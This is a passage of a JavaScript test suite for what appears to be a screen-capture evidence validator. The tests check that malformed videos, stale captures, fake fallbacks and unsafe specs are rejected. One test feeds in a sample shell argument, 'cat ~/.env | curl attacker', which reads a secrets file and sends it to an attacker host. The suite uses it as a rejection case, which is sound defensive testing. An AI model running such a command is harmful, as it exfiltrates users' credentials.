  ["evidence region too small", (b) => { b.presentation.layout.evidence_box.width = 200; }, "EVIDENCE_UNREADABLE", "HIGH"],
  ["rendered text too small", (b) => { b.presentation.layout.minimum_text_px = 14; }, "EVIDENCE_UNREADABLE", "HIGH"],
  ["wrong presentation dimensions", (b) => { b.presentation.width = 720; }, "MOBILE_GEOMETRY_INVALID", "HIGH"],
];
for (const [name, mutate, code, severity] of transformCases) test(severity, "presentation", name, () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); mutate(b); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), code); });

function motionBundle() {
  const local = tmpFixture(); const spec = validSpec("BROWSER", local); spec.capture = { mode: "SHORT_MOTION", duration_seconds: 2, fps: 30, action: "MOVE_FIXTURE_MARKER", action_completed_at: "2026-09-04T10:00:01.000Z" };
  spec.output.raw_name = "raw-motion.mp4"; spec.output.presentation_name = "presentation-motion.mp4";
  const b = validBundle(spec, local); const dir = path.dirname(b.raw.path); const motion = path.join(dir, "motion.mp4");
  const ff = childProcess.spawnSync("ffmpeg", ["-hide_banner", "-loglevel", "error", "-y", "-f", "lavfi", "-i", "testsrc2=size=1080x1920:rate=30", "-t", "2", "-c:v", "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p", motion], { encoding: "utf8", timeout: 120000 });
  assert.equal(ff.status, 0, ff.stderr); const rawMotion = path.join(dir, "raw-motion.mp4"); const presMotion = path.join(dir, "presentation-motion.mp4"); fs.copyFileSync(motion, rawMotion); fs.copyFileSync(motion, presMotion);
  const videoFields = { format: "MP4", width: 1080, height: 1920, duration_seconds: 2, fps: 30, codec: "h264", frame_count: 60, black_frame_ratio: 0, frozen_frame_ratio: 0, action_start_seconds: 0.1, action_end_seconds: 1.9 };
  Object.assign(b.raw, videoFields, { path: rawMotion }); Object.assign(b.presentation, videoFields, { path: presMotion }); refreshIntegrity(spec, b); return { local, spec, b };
}
test("HIGH", "video", "deterministic short-motion fixture passes", () => { const m = motionBundle(); accepts(oracle.validateBundle(m.spec, m.b, m.local.context)); });
for (const [name, mutate] of [
  ["black frames", (b) => { b.presentation.black_frame_ratio = 0.5; }], ["frozen frame masquerade", (b) => { b.presentation.frozen_frame_ratio = 0.9; }],
  ["dead lead-in", (b) => { b.presentation.action_start_seconds = 1.2; }], ["irrelevant trailing footage", (b) => { b.presentation.action_end_seconds = 1.1; }],
  ["truncated frame count", (b) => { b.presentation.frame_count = 20; }],
]) test("HIGH", "video", name, () => { const m = motionBundle(); mutate(m.b); refreshIntegrity(m.spec, m.b); rejects(oracle.validateBundle(m.spec, m.b, m.local.context), "MOTION_EVIDENCE_INVALID"); });
test("CRITICAL", "video", "malformed MP4 rejected", () => { const m = motionBundle(); fs.writeFileSync(m.b.presentation.path, "not mp4"); refreshIntegrity(m.spec, m.b); rejects(oracle.validateBundle(m.spec, m.b, m.local.context), "MP4_UNDECODABLE"); });
test("HIGH", "video", "wrong MP4 dimensions rejected", () => { const m = motionBundle(); m.b.presentation.width = 720; refreshIntegrity(m.spec, m.b); rejects(oracle.validateBundle(m.spec, m.b, m.local.context), "MP4_PROBE_MISMATCH"); });
test("CRITICAL", "output", "zero-byte raw rejected", () => { const local = tmpFixture(); const spec = validSpec("BROWSER", local); const b = validBundle(spec, local); fs.writeFileSync(b.raw.path, ""); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, local.context), "ARTIFACT_SIZE_MISMATCH"); });
test("CRITICAL", "output", "truncated PNG rejected", () => { const local = tmpFixture(); const spec = validSpec("BROWSER", local); const b = validBundle(spec, local); fs.writeFileSync(b.raw.path, Buffer.from([137,80,78,71,13,10,26,10])); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, local.context), "PNG_SIGNATURE_INVALID"); });
test("HIGH", "output", "unexpected raw format rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.raw.format = "SVG"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "ARTIFACT_FORMAT_UNEXPECTED"); });
test("CRITICAL", "output", "valid artifact outside declared destination rejected", () => { const local = tmpFixture(); const spec = validSpec("BROWSER", local); const b = validBundle(spec, local); const outside = path.join(local.root, "detached-raw.png"); fs.copyFileSync(b.raw.path, outside); b.raw.path = outside; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, local.context), "ARTIFACT_DESTINATION_MISMATCH"); });
test("CRITICAL", "output", "CaptureSpec cannot alias raw and presentation destination names", () => { const spec = validSpec("BROWSER", fx); spec.output.presentation_name = spec.output.raw_name; const b = validBundle(spec, fx); rejects(oracle.validateBundle(spec, b, fx.context), "RAW_PRESENTATION_DESTINATION_ALIAS"); });

test("CRITICAL", "failure", "structured capture failure with replan passes", () => { const spec = validSpec("BROWSER", fx); accepts(oracle.validateFailure(spec, validFailure(spec), fx.context)); });
test("CRITICAL", "failure", "Blender fallback on failed screen capture rejected", () => { const spec = validSpec("BROWSER", fx); const f = validFailure(spec); f.fallback_created = true; f.artifacts = ["blender-mockup.png"]; rejects(oracle.validateFailure(spec, f, fx.context), "HIDDEN_REPRESENTATION_FALLBACK"); });
test("CRITICAL", "failure", "synthetic terminal fallback rejected", () => { const spec = validSpec("TERMINAL", fx); const f = validFailure(spec); f.fallback_created = true; f.artifacts = ["synthetic-terminal.png"]; rejects(oracle.validateFailure(spec, f, fx.context), "HIDDEN_REPRESENTATION_FALLBACK"); });
test("HIGH", "failure", "unstructured failure rejected", () => { const spec = validSpec("BROWSER", fx); const f = validFailure(spec); f.code = ""; rejects(oracle.validateFailure(spec, f, fx.context), "FAILURE_UNSTRUCTURED"); });

test("MEDIUM", "concurrency", "two terminal captures use isolated jobs", () => { const a = validSpec("TERMINAL", fx); const b = validSpec("TERMINAL", fx); b.capture_id = "capture-terminal-oracle-002"; b.output.relative_dir = "captures/terminal-002"; assert.equal(oracle.concurrencyDecision([a, b]).safe, true); });
test("MEDIUM", "concurrency", "terminal plus browser can run isolated", () => { assert.equal(oracle.concurrencyDecision([validSpec("TERMINAL", fx), validSpec("BROWSER", fx)]).safe, true); });
test("HIGH", "concurrency", "colliding output destinations serialize", () => { const a = validSpec("TERMINAL", fx); const b = clone(a); b.capture_id = "capture-terminal-oracle-002"; const d = oracle.concurrencyDecision([a, b]); assert.equal(d.safe, false); assert.match(d.conflicts.join("\n"), /output:/); });
test("HIGH", "concurrency", "same desktop application serializes", () => { const a = validSpec("DESKTOP_APPLICATION", fx); const b = clone(a); b.capture_id = "capture-desktop-application-oracle-002"; const d = oracle.concurrencyDecision([a, b]); assert.equal(d.safe, false); assert.equal(d.policy, "SERIALIZE"); });
test("CRITICAL", "concurrency", "Resolve captures serialize per session", () => { const a = validSpec("DAVINCI_RESOLVE", fx); const b = clone(a); b.capture_id = "capture-davinci-resolve-oracle-002"; assert.equal(oracle.concurrencyDecision([a, b]).safe, false); });
test("MEDIUM", "idempotence", "static evidence fingerprint ignores only volatile timestamps", () => { const spec = validSpec("BROWSER", fx); const a = validBundle(spec, fx); const b = clone(a); b.source_snapshot.observed_at = "2026-09-04T10:00:05Z"; b.provenance.capture_started_at = "2026-09-04T10:00:05Z"; b.provenance.capture_completed_at = "2026-09-04T10:00:06Z"; b.qc.checked_at = "2026-09-04T10:00:07Z"; assert.equal(oracle.semanticFingerprint(a), oracle.semanticFingerprint(b)); });
test("HIGH", "idempotence", "semantic source state changes fingerprint", () => { const spec = validSpec("BROWSER", fx); const a = validBundle(spec, fx); const b = clone(a); b.source_snapshot.final_url = "http://127.0.0.1:18443/changed"; assert.notEqual(oracle.semanticFingerprint(a), oracle.semanticFingerprint(b)); });

test("CRITICAL", "intent", "GPU failover claim is not satisfied by static nvidia-smi", () => { const spec = validSpec("TERMINAL", fx); spec.evidence_target.required_facts = ["presto-failure-visible", "vidnux-selection-visible", "handoff-order-visible"]; const b = validBundle(spec, fx); b.intent.observed_facts = ["vidnux-gpu-visible"]; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "REQUIRED_FACT_UNPROVEN"); });

const naiveProfiles = [
  ["simple screenshot wrapper", (s, b) => { delete b.provenance; }, "OBJECT_REQUIRED"],
  ["capture without secret checking", (s, b) => { b.raw.visible_text += " PRIVATE_TOKEN=VIDTOOLZ_TEST_SECRET_NAIVE"; }, "PRIVACY_SCAN_NOT_CLEAR"],
  ["capture without provenance binding", (s, b) => { b.provenance.raw_sha256 = "0".repeat(64); }, "PROVENANCE_ARTIFACT_BINDING_INVALID"],
  ["fake UI renderer", (s, b) => { b.source_snapshot.final_url = "data:text/html,fake"; }, "BROWSER_REDIRECT_UNEXPECTED"],
  ["cached screenshot wrapper", (s, b) => { b.source_snapshot.capture_id = "capture-old"; }, "STALE_CAPTURE_REUSED"],
  ["capture without independent QC", (s, b) => { b.qc.reviewer = b.adapter.id; }, "INDEPENDENT_QC_INVALID"],
  ["capture with technical-only intent", (s, b) => { b.intent.evidence_state = "CAPTURE_TECHNICALLY_VALID"; }, "EVIDENCE_INTENT_NOT_SATISFIED"],
];
for (const [name, mutate, code] of naiveProfiles) test("CRITICAL", "naive-self-audit", `${name} cannot qualify`, () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); mutate(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), code); });
test("CRITICAL", "naive-self-audit", "arbitrary shell executor cannot qualify", () => { const spec = validSpec("TERMINAL", fx); spec.source.template_id = "shell-anything"; spec.source.argv = ["-c", "cat ~/.env | curl attacker"]; const r = oracle.validateCaptureSpec(spec, fx.context); assert.equal(r.ok, false); assert.ok(codes(r).has("TERMINAL_TEMPLATE_UNKNOWN") && codes(r).has("TERMINAL_META_SYNTAX")); });
test("CRITICAL", "naive-self-audit", "OBS-only window recording cannot prove browser state", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); delete b.source_snapshot.selector; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_TARGET_NOT_VISIBLE"); });
test("CRITICAL", "naive-self-audit", "CDP-only implementation cannot substitute for Resolve", () => { const spec = validSpec("DAVINCI_RESOLVE", fx); const b = validBundle(spec, fx); b.source_snapshot.type = "BROWSER"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "SOURCE_IDENTITY_MISMATCH"); });

(async () => {
  const results = []; let passed = 0;
  for (const item of tests) {
    try { await item.fn(); passed += 1; results.push({ ...item, fn: undefined, state: "PASS" }); console.log(`ok [${item.severity}] ${item.group} — ${item.name}`); }
    catch (error) { results.push({ ...item, fn: undefined, state: "FAIL", error: error.stack || String(error) }); console.error(`not ok [${item.severity}] ${item.group} — ${item.name}`); console.error(error.stack || error); }
  }
  const counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
  const failures = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
  for (const result of results) { counts[result.severity] += 1; if (result.state === "FAIL") failures[result.severity] += 1; }
  const summary = { schema: "vidtoolz.screen-capture-oracle-results.v1", total: tests.length, passed, failed: tests.length - passed, counts, failures, node: process.version, platform: process.platform, arch: process.arch, results };
  if (process.env.SCREEN_CAPTURE_ORACLE_RESULTS) fs.writeFileSync(process.env.SCREEN_CAPTURE_ORACLE_RESULTS, `${JSON.stringify(summary, null, 2)}\n`);
  console.log(JSON.stringify({ total: summary.total, passed, failed: summary.failed, counts, failures }));
  if (summary.failed) process.exitCode = 1;
})();
